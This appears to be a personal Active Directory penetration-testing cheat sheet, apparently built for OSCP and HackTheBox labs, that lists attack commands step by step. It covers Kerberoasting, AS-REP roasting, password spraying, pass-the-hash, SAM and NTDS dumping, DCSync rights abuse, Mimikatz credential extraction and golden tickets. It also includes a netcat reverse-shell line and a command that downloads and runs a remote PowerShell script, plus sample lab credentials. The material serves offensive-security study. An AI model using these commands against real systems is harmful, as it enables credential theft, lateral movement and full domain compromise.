# hiya
these are just notes lifted from various sources so i can use them anywhere
sources that i can remember listed below:
```
https://whimsical.com/active-directory-YJFeAhW9GMtmLX4SWxKCCM  # outline strongly based on this map
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg
https://drive.google.com/file/d/1sLxTSGQImCxE8KbPi063OuH461ADzCR3/view    # complements top mindmap heavily
https://juggernaut-sec.com/dumping-credentials-sam-file-hashes/
https://github.com/antonioCoco/RunasCs/blob/master/README.md
https://0xdf.gitlab.io/2020/03/21/htb-forest.html
https://tryhackme.com/    # all the AD rooms, quality instruction
https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/
https://blog.netwrix.com/2022/10/04/overpass-the-hash-attacks/
https://notes.benheater.com/books/active-directory
https://viewer.diagrams.net/?tags=%7B%7D&highlight=0000ff&layers=1&nav=1&title=Active+Directory+Attack+Map.drawio&ref=benheater.com#Uhttps%3A%2F%2Fdrive.google.com%2Fuc%3Fid%3D1druc7xxSccKXcNuSt_p3xm3E_sgL18zf%26export%3Ddownload ## ** 
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces    ## particularly amazing website
```

don't turn off your brain, it's a killchain, not a chillchain. be flexible


# tools

feeling cute, might make into a workspace setup script later
```
https://github.com/GhostPack/Seatbelt
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
https://github.com/Tib3rius/AutoRecon
    sudo apt install seclists curl dnsrecon enum4linux feroxbuster gobuster impacket-scripts nbtscan nikto nmap onesixtyone oscanner redis-tools smbclient smbmap snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
    sudo apt install python3-venv
    python3 -m pip install --user pipx
    python3 -m pipx ensurepath
    pipx install git+https://github.com/Tib3rius/AutoRecon.git
```

# active directory checklist
```
1. Gain access to a domain user account.
2. Enumerate the domain with the commands listed above.
3. Enumerate all computers on the domain. Don't just enumerate one computer.. Enumerate them all.
4. Enumerate all users logged onto computers that we have local administrator access to.
5. Kerberoast with any user account acquired (GetUserSPNs, Invoke-Kerberoast, etc)
6. Attempt credential-based attacks against all discovered user accounts.
7. Pass the Hash to pivot (Also try to Pass the Ticket if applicable).
8. Run Mimikatz on all systems (Can also run LSASSY with CrackMapExec).
9. Enumerate password hashes and tickets: `sekurlsa::logonpasswords` and `sekurlsa::tickets`.

https://parzival.sh/blog/my-oscp-notes-and-resources
```

# basic enum

// runas
```
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

// cmd ad enumeration
```
net user
net user /domain
net user <username> /domain
net group
net group /domain
net group "<group>" /domain
net accounts /domain
```

// powershell ad enum
```
get-aduser -identity <name> -server <domain> -properties *
get-aduser -identity <name> -server <domain> -properties * | format-table name,samaccountname -A
get-adgroup -identity <name> -server <domain> -properties *
get-adgroupmember -identity <name> -server <domain> -properties *

$changedate = new-object datetime(2024, 03, 19, 12, 00, 00)
get-adobject -filter 'whenchanged -gt $changedate' -includedeletedobjects -server <domain>
get-adobject -filter 'badPwdCount -gt 0' -server <domain>       // avoid locking out accounts

get-addomain -server <domain>
set-adaccountpassword -identity <name> -server <domain> -oldpassword (convertto-sercurestring -asplaintext "old" -force) -newpassword (convertto-securestring -asplaintext "new" -force) // change password?
```

// sharphound
```
Sharphound.exe --CollectionMethods <Methods> --Domain <domain> --ExcludeDCs
```

// powerview
```
Get-NetLoggedOn
Get-NetComputer | Get-NetLoggedon
Get-NetUser
Get-NetUser -UserName <username>
Get-NetComputer
Get-NetComputer -Unconstrained
Get-DomainShare
Find-DomainShare -CheckShareAccess -Domain <domain> -DomainController <dc_ip>
Get-DomainOU -Properties Name | sort -Property Name
Get-NetUser -SPN | select serviceprincipalname
Request-SPNTicket -SPN "MSSQLSvc/DC.access.offsec" -Format Hashcat
Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl
```
// smb share
```
smbmap -R '\' -H <host> -P 445
smbmap -R '\' -H <host> -P 445 -u <username> -p <password>
smbmap -d active.htb -u svc_tgs -p <password> -H <ip>
proxychains smbclient \\\\172.16.240.83\\Windows -U 'medtech.com\joe'
crackmapexec smb <ip> -u <user> -p <pass> --shares
sudo crackmapexec smb <target_ip> -u username -p pass -M spider_plus --share '<share>'
```

// LDAP -- find usernames
```
ldapsearch x -h ldap://<IP> -s base
ldapsearch -x -h <ip> -s base namingcontexts
ldapsearch -x -h <ip> -b 'DC = , DC = ' -s sub
```

// general find users
```
crackmapexec smb <ip> -u '' -p '' --users
nmap --script smb-enum* -p 445 <target_ip>
ldapsearch -H ldap://<target_ip> -x -b "DC=htb,DC=local" (objectClass=user)' sAMAccountName
rpcclient -U '' 10.10.10.161 #powerfull
    queryusergroups <RID>
    querygroup <Group RID>
    queryuser <RID>
GetADUsers.py -all <domain/username>:<password> -dc-ip <ip>
```

// internal scan
```
proxychains crackmapexec smb <ip_addrs>
proxychains nmap -sT -p80,443,135,139,445,21,53,22,23,389,636,3268,3269,25,5985,5986,3389,88,111,161,1433,110 <target_ip> -Pn
```

// responder
```
sudo responder -I <tunnel>
hashcat -m 5600 <hash file> <password file> --force
```

# worth trying

// investigate SYSVOL on the DC
```
smbclient -U '<user>' \\\\<dc_ip>\\SYSVOL # authenticated session to connect to a windows share (you will be prompted for a password)
```

// null login
```
crackmapexec smb <ip> --shares -u '' -p ''
smbmap -H <ip> -u '' -p ''
smbmap -H <ip> -u ''
rpcclient <ip> -U ''
  enumdomusers
```

# user, no pass

// asrep roast
```
python3 GetNPUsers.py htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt
```

// password spray
```
crackmapexec smb <IP> -u users.txt -p password.txt
  proxychains crackmapexec smb 172.16.224.82 -u <each user in the domain> -H hash.txt OR -P <password>
```

// dump password policy
```
crackmapexec smb --pass-pol <target_ip>
  proxychains crackmapexec smb targets.txt -u <pass> -p <username>
```

# good creds
// kerberoasting
```
impacket-GetUserSPNs -request -dc-ip <dc-ip> <full domain>/<user>:<password>
impacket-GetUserSPNs -no-preauth "<asrep_user>" -usersfile "<userlist.txt>" -dc-host "<dc_ip>" "<domain>"/
Rubeus.exe kerberoast

# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local

# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast # specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap         # every admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

// crackhash
```
#Kerberos 5 TGS etype 23
hashcat -m 13100 -a 0 hash rockyou.txt
#Kerberos asrep 23
hashcat -m 18200 hash rockyou.txt
#NTLM (mimikatz sam dump, sekurlsa::logonpasswords)
hashcat -m 1000 hash <wordlist>
```

// get a token for bloodhund
```
runas /netonly /user:active.htb\svc_tgs cmd
https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
Invoke-RunasCs svc_mssql trustno1 "cmd /c C:\xampp\htdocs\uploads\nc.exe -e cmd.exe <target_ip> <rev_port>"
```

// bloodhound
```
Location /opt/BloodHound-linux-x64/resources/app/Collectors
sudo neo4j console
sudo ./BloodHound --no-sandbox

# on target machine
Import-Module ./SharpHound.ps1
invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-
alfresco -ldappass s3rvice
.\sharp.exe -c all -d <domain>
```

# lateral movement

// interactive!
```
impacket-psexec <domain>/<user>:<password>@<ip>  # write ADMIN$ writable shares with powerview scripts
impacket-wmiexec -hashes <hash> htb.local/administrator@<ip>

xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /drive:/usr/share/windows-resources,share

evil-winrm -i <ip> -u <user> -p <password>

atexec.py <domain>/<user>:<password>@<ip> "command"
smbexec.py <domain>/<user>:<password>@<ip>
psexec.py <domain>/<user>:<password>@<ip>
wmiexec.py <domain>/<user>:<password>@<ip>
dcomexec.py <domain>/<user>:<password>@<ip>
crackmapexec smb <ip_range> -u <user> -d <domain>
crackmapexec smb <ip_range> -u <user> -d <domain> -local-auth
```

// pass the hash
```
crackmapexec smb 192.168.154.171 -u 'ted' -d 'exam.com' -H ':
31aa99ebd6ea4b6d07051acfd48efa35' --shares
impacket-psexec -hashes ":<hash>" <domain>/ <user>@<target_ip>
impacket-psexec -hashes ":<hash>" <user>@<target_ip>
evil-winrm -i <target_ip> -u <username> -H <hash>
```

// dump SAM
```
reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\SYSTEM
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

// steal RDP session
```
# requires SYSTEM
PsExec64.exe -s cmd.exe
query user
tscon <id> /dest:<session_name> # requires session to be in a disconnected state
```

# permissions move
// powerview enum
```
# we're looking for the following permissions
# * DS-Replication-Get-Changes
# * DS-Replication-Get-Changes-All
# * DS-Replication-Get-Changes-In-Filtered-Set

Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -eq '<username>'}

# one-liner that lets us do sick shit (dcsync rights)
Add-DomainGroupMember -Identity 'Domain Admins' -Members <username>; $username = "<domain>\\<username>";
$password = "<password>";
$secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr;
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity '<user>' -TargetIdentity '<domain>\\Domain Admins' -Rights DCSync

# basic dcsync if the above is too granular
Add-ObjectACL -PrincipalIdentity spotless -Rights DCSync
Get-ObjectAcl -Identity "dc=offense,dc=local" -ResolveGUIDs | ? {$_.SecurityIdentifier -match "S-1-5-21-2552734371-813931464-1050690807-1106"}

net group "Exchange Windows Permissions"
secretsdump.py svc-alfresco:s3rvice@<ip>
wmiexec.py -hashes <hash> <domain>/administrator@<ip>

# dump dc hashes in mimikatz
lsadump::dcsync /user:krbtgt

```

// mimikatz :3
```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
sekurlsa::tickets /export
lsadump::sam
kerberos::purge
kerberos::list

#RC4 can be ntlm hash
kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /target:<domain_controller> /service:<service> /rc4:<rc4_hash> /ptt

#overpassthehash
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:PowerShell.exe
Sekurlsa::pth /user:[USER] /domain:[DOMAIN] /ntlm:[NTLM HASH]
Lsadump::dcsync /user:[USER] /domain:[DOMAIN]
```

// NTDS.dir cracking
```
impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
```
